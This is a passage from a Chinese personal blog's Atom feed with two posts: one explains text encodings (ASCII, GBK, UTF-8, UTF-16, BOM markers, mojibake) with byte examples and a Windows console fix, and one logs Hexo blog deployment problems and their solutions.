也成为了<strong>可变长度</strong>字符编码，最小单位是一致的。</p><p><strong>请注意，UTF-16 编码不兼容 ASCII！！！！！！！！！！！！</strong></p><h3 id="编码对应的开头标志"><a href="#编码对应的开头标志" class="headerlink" title="编码对应的开头标志"></a>编码对应的开头标志</h3><p>这个东西貌似不太常用，但是姑且先放在这里：<br>EF BB BF        UTF-8<br>FE FF            UTF-16/UCS-2, big endian.<br>FF FE            UTF-16/UCS-2, little endian<br>FF FE 00 00        UTF-32/UCS-4, little endian.<br>00 00 FE FF        UTF-32/UCS-4, big-endian.</p><h3 id="UTF-8-or-UTF-16"><a href="#UTF-8-or-UTF-16" class="headerlink" title="UTF-8 or UTF-16?"></a>UTF-8 or UTF-16?</h3><p>请查阅参考资料 “Unicode(UTF-8, UTF-16)令人混淆的概念”。<br><br></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="示例-1："><a href="#示例-1：" class="headerlink" title="示例 1："></a>示例 1：</h3><p>源文本 1：Miracle<br>ASCII（16 进制）：4D 69 72 61 63 6C 65</p><h3 id="示例-2："><a href="#示例-2：" class="headerlink" title="示例 2："></a>示例 2：</h3><p>源文本 2：我是忧郁沙茶<br>GBK（16 进制）：CED2 CAC7 D3C7 D3F4 C9B3 B2E8<br>GBK（2 进制）：<br>1100111011010010 1100101011000111<br>1101001111000111 1101001111110100<br>1100100110110011 1011001011101000</p><p>Unicode（16 进制）：6211 662F 5FE7 90C1 6C99 8336<br>Unicode（2 进制）：<br>0110001000010001 0110011000101111<br>0101111111100111 1001000011000001<br>0110110010011001 1000001100110110</p><p>UTF-8（16 进制）：E68891 E698AF E5BFA7 E98381 E6B299 E88CB6<br>UTF-8（2 进制）：<br>111001101000100010010001 111001101001100010101111<br>111001011011111110100111 111010011000001110000001<br>111001101011001010011001 111010001000110010110110<br><br></p><h2 id="大端法与小端法"><a href="#大端法与小端法" class="headerlink" title="大端法与小端法"></a>大端法与小端法</h2><h2 id="关于编码错误…"><a href="#关于编码错误…" class="headerlink" title="关于编码错误…"></a>关于编码错误…</h2><h3 id="锟斤拷烫烫烫"><a href="#锟斤拷烫烫烫" class="headerlink" title="锟斤拷烫烫烫"></a>锟斤拷烫烫烫</h3><p>参照一位知乎匿名用户的解释：</p><blockquote><p>GBK 编码传过去，UTF-8 的服务器不认得，给你返回了容错字符，又被 GBK 翻译回了汉字。。</p></blockquote><h3 id="非常常见的编码问题——ANSI-与-UTF-8-的不兼容"><a href="#非常常见的编码问题——ANSI-与-UTF-8-的不兼容" class="headerlink" title="非常常见的编码问题——ANSI 与 UTF-8 的不兼容"></a>非常常见的编码问题——ANSI 与 UTF-8 的不兼容</h3><p>先说背景吧。我使用的操作系统是 Windows 10，代码编辑器为 VS Code，采用的默认编码是 UTF-8。</p><p>某一天我心血来潮，写了个自动进行 USTC 健康打卡的 Python 脚本，并写了个批处理程序用来每天运行它。<br>然而，值得注意的是，脚本中的一些提示信息是用中文输出的。<br>众所周知，Windows 命令行的默认字符编码是 ANSI，在中文系统下就是 GBK。（大概？）<br>然而，我刚开始写的时候并没有考虑到这个问题……<br>于是，在我第一次使用批处理程序运行脚本时，它成功输出了一堆乱码……</p><p>刚开始，秉持着绝不向 ANSI 低头的决心，我将命令行的编码永久设置为了 UTF-8。<br>然而设置完成之后我却发现，中文路径的显示出现了问题。</p><p>想了想，秉持着绝不向 ANSI 低头的决心，我在批处理文件的开头加了一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><p>这就能使得打开的命令行窗口的字符编码更改为 UTF-8，并且不影响其他的命令行程序。<br><br></p>]]></content>
    
    
    <summary type="html">现在有 ASCII、ANSI、Unicode（UTF-8、UTF-16）的简介和一些案例（？）。</summary>
    
    
    
    
    <category term="计算机杂项" scheme="http://crabtux.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>建立博客时遇到的问题归档</title>
    <link href="http://crabtux.github.io/2021/07/01/%E5%BB%BA%E7%AB%8B%E5%8D%9A%E5%AE%A2%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%B0%8F%E6%B1%87%E6%80%BB/"/>
    <id>http://crabtux.github.io/2021/07/01/%E5%BB%BA%E7%AB%8B%E5%8D%9A%E5%AE%A2%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%B0%8F%E6%B1%87%E6%80%BB/</id>
    <published>2021-07-01T07:34:11.000Z</published>
    <updated>2021-07-01T07:34:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题1：无法部署网站"><a href="#问题1：无法部署网站" class="headerlink" title="问题1：无法部署网站"></a>问题1：无法部署网站</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>在执行 hexo d 命令后，等待数秒，出现以下报错。<br><img src="/images/blog02/image01.png" alt="第一张图片" title="第一张图片"></p><blockquote><p><strong>fatal: unable to access ‘<a href="https://github.com/Crabtux/Crabtux.github.io.git&#39;">https://github.com/Crabtux/Crabtux.github.io.git&#39;</a>: OpenSSL SSL_read: Connection was reset, errno 10054</strong></p></blockquote><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>网络问题，挂代理即可。具体来讲，大概就是往环境变量里面加 <code>HTTP_PROXY</code> 和 <code>HTTPS_PROXY</code>。</p><h2 id="问题2：缺少依赖包导致网页渲染出错"><a href="#问题2：缺少依赖包导致网页渲染出错" class="headerlink" title="问题2：缺少依赖包导致网页渲染出错"></a>问题2：缺少依赖包导致网页渲染出错</h2><h3 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h3><p>我目前使用的 hexo 主题是 butterfly。配置完成之后，我打算在本机部署测试一下，然而在执行 hexo s 出现了报错：</p><blockquote><p><strong>extends includes/layout.pug block content #recent-posts.recent-posts include includes/recent-posts.pug include includes/pagination.pug</strong> </p></blockquote><p>这下可把我整不会了，上网一顿搜索之后，发现是因为少了几个依赖包，果断安装，然而在安装 hexo-browsersync 的时候又出了问题。</p><p>读错误提示，发现是因为没有装 Visual Studio C++？（外网的搜索结果也一致，懒得排查更深层的原因了），花了点时间装了一下，问题就解决了。</p><p>2022/8/16:<br>迁移到新笔记本之后突然就不需要 Visual Studio 了，非常神必。</p>]]></content>
    
    
    <summary type="html">听说这里要有一个描述？</summary>
    
    
    
    
    <category term="问题归档" scheme="http://crabtux.github.io/tags/%E9%97%AE%E9%A2%98%E5%BD%92%E6%A1%A3/"/>
    
  </entry>
  
</feed>
